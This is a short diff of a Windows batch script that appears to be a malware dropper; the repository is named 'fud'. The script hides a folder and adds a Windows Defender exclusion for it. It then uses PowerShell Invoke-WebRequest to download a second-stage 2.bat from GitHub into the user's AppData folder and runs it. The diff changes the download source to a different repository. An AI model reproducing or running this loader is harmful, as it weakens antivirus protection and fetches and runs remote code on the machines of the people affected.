@@ -1,4 +1,4 @@
-cls
+ÿþ
 
 @echo off
 
@@ -32,6 +32,6 @@ attrib +h "Anon" /s /d
 
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
+Powershell -Command "Invoke-Webrequest 'https://github.com/geradh/test/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
 cd C:\Users\%USERNAME%\AppData\Local\Anon"
 start 2.bat
